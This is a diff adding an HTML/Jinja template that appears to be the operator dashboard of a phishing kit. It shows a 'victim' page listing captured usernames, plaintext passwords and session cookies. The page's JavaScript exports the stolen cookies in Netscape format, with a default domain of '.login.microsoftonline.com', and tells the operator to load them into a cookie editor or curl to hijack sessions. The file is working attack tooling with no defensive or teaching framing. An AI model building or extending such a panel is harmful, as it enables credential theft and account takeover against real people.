@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Captured Data - Victim {{ victim_id }}</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            max-width: 1400px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #f0f2f5;
+            color: #1a1a2e;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .container h2 {
+            margin-top: 0;
+            color: #1a1a2e;
+            font-weight: 600;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        th {
+            text-align: left;
+            padding: 12px 10px;
+            border-bottom: 2px solid #e8ecf1;
+            font-weight: 600;
+            color: #4a4a6a;
+            background: #f8f9fa;
+        }
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #e8ecf1;
+            vertical-align: middle;
+        }
+        tr:hover td {
+            background: #f8f9fa;
+        }
+        .cookie-val {
+            font-family: monospace;
+            font-size: 12px;
+            background: #f0f2f5;
+            padding: 4px 8px;
+            border-radius: 4px;
+            max-width: 350px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .cookie-full {
+            display: none;
+            word-break: break-all;
+            max-width: 600px;
+            background: #f8f9fa;
+            padding: 8px 12px;
+            border-radius: 4px;
+            margin-top: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            border: 1px solid #e8ecf1;
+        }
+        .btn {
+            padding: 6px 14px;
+            font-size: 12px;
+            border-radius: 6px;
+            border: 1px solid #d0d5dd;
+            cursor: pointer;
+            background: white;
+            color: #1a1a2e;
+            transition: all 0.2s;
+            margin-right: 4px;
+        }
+        .btn:hover {
+            background: #f0f2f5;
+        }
+        .btn-success {
+            background: #2ecc71;
+            color: white;
+            border-color: #2ecc71;
+        }
+        .btn-success:hover {
+            background: #27ae60;
+        }
+        .btn-export {
+            background: #4cc9f0;
+            color: white;
+            border-color: #4cc9f0;
+        }
+        .btn-export:hover {
+            background: #3ab8df;
+        }
+        .export-box {
+            background: #f8f9fa;
+            border: 2px solid #2ecc71;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        .export-box textarea {
+            width: 100%;
+            height: 180px;
+            font-family: monospace;
+            font-size: 11px;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid #d0d5dd;
+            background: white;
+            resize: vertical;
+            display: none;
+            margin-top: 12px;
+        }
+        .export-box .btn-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .badge-success { background: #d4edda; color: #155724; }
+        .badge-warning { background: #fff3cd; color: #856404; }
+        .badge-info { background: #d1ecf1; color: #0c5460; }
+        .back-link {
+            display: inline-block;
+            margin-top: 20px;
+            color: #4361ee;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        .actions-cell {
+            white-space: nowrap;
+        }
+        .header-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .info-msg {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 10px 16px;
+            border-radius: 6px;
+            margin-top: 12px;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-bar">
+        <h1>🍪 Captured Data</h1>
+        <a href="/admin" class="back-link">← Back to Dashboard</a>
+    </div>
+    <p style="color: #7a7a9a; margin-top: -10px;">Victim ID: {{ victim_id }}</p>
+
+    <!-- Credentials -->
+    <div class="container">
+        <h2>🔐 Credentials</h2>
+        {% if creds %}
+        <table>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Captured At</th>
+            </tr>
+            {% for c in creds %}
+            <tr>
+                <td><strong>{{ c.username }}</strong></td>
+                <td><code style="background:#f0f2f5; padding:2px 8px; border-radius:4px;">{{ c.password }}</code></td>
+                <td>{{ c.captured_at }}</td>
+            </tr>
+            {% endfor %}
+        </table>
+        {% else %}
+        <p style="color: #7a7a9a;">No credentials captured.</p>
+        {% endif %}
+    </div>
+
+    <!-- Cookies -->
+    <div class="container">
+        <h2>🍪 Cookies</h2>
+
+        <!-- Export Box -->
+        <div class="export-box" id="exportBox">
+            <strong style="font-size: 16px;">📦 Export All Cookies</strong>
+            <div class="btn-group">
+                <button class="btn btn-export" onclick="exportNetscape()">📄 Export as Netscape</button>
+                <button class="btn btn-success" id="exportCopyBtn" onclick="copyExport()" style="display:none;">📋 Copy</button>
+            </div>
+            <div id="infoMsg" class="info-msg">
+                ✅ Netscape format ready. Copy and paste into your cookie editor or use with curl.
+            </div>
+            <textarea id="exportOutput" readonly></textarea>
+        </div>
+
+        {% if cookies %}
+        <table>
+            <tr>
+                <th>Name</th>
+                <th>Value</th>
+                <th>Domain</th>
+                <th>Secure</th>
+                <th>Expires</th>
+                <th>Actions</th>
+            </tr>
+            {% for c in cookies %}
+            <tr>
+                <td><strong>{{ c.cookie_name }}</strong></td>
+                <td>
+                    <span class="cookie-val" id="preview_{{ c.id }}">{{ c.cookie_value[:50] }}{% if c.cookie_value|length > 50 %}...{% endif %}</span>
+                    <div class="cookie-full" id="full_{{ c.id }}">{{ c.cookie_value }}</div>
+                </td>
+                <td>{{ c.domain }}</td>
+                <td><span class="badge {% if c.secure %}badge-success{% else %}badge-warning{% endif %}">{{ 'Yes' if c.secure else 'No' }}</span></td>
+                <td>{{ c.expires_at or 'Session' }}</td>
+                <td class="actions-cell">
+                    <button class="btn" onclick="toggleCookie('{{ c.id }}')">Show Full</button>
+                    <button class="btn btn-success" onclick="copyCookie('{{ c.id }}')">📋 Copy</button>
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+        {% else %}
+        <p style="color: #7a7a9a;">No cookies captured.</p>
+        {% endif %}
+    </div>
+
+    <script>
+    function toggleCookie(id) {
+        var el = document.getElementById('full_' + id);
+        var btn = el.closest('td').querySelector('.btn:not(.btn-success)');
+        if (el.style.display === 'block') {
+            el.style.display = 'none';
+            btn.textContent = 'Show Full';
+        } else {
+            el.style.display = 'block';
+            btn.textContent = 'Hide';
+        }
+    }
+
+    function copyCookie(id) {
+        var el = document.getElementById('full_' + id);
+        var text = el.textContent.trim();
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText(text).then(function() {
+                var btn = event.target;
+                var orig = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
+            });
+        } else {
+            var textarea = document.createElement('textarea');
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            var btn = event.target;
+            var orig = btn.textContent;
+            btn.textContent = '✅ Copied!';
+            setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
+        }
+    }
+
+    function exportNetscape() {
+        var cookies = [];
+        {% for c in cookies %}
+        cookies.push({
+            name: '{{ c.cookie_name }}',
+            value: '{{ c.cookie_value }}',
+            domain: '{{ c.domain }}' || '.login.microsoftonline.com',
+            secure: {{ 'true' if c.secure else 'false' }},
+            expires: '{{ c.expires_at or '0' }}'
+        });
+        {% endfor %}
+        var lines = ['# Netscape HTTP Cookie File'];
+        cookies.forEach(function(c) {
+            lines.push(c.domain + '\tTRUE\t/\t' + (c.secure ? 'TRUE' : 'FALSE') + '\t' + c.expires + '\t' + c.name + '\t' + c.value);
+        });
+        var output = document.getElementById('exportOutput');
+        output.value = lines.join('\n');
+        output.style.display = 'block';
+        document.getElementById('exportCopyBtn').style.display = 'inline-block';
+        document.getElementById('infoMsg').style.display = 'block';
+        document.getElementById('exportBox').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function copyExport() {
+        var el = document.getElementById('exportOutput');
+        var text = el.value;
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText(text).then(function() {
+                var btn = document.getElementById('exportCopyBtn');
+                var orig = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
+            });
+        } else {
+            el.select();
+            document.execCommand('copy');
+            var btn = document.getElementById('exportCopyBtn');
+            var orig = btn.textContent;
+            btn.textContent = '✅ Copied!';
+            setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
+        }
+    }
+    </script>
+</body>
+</html>
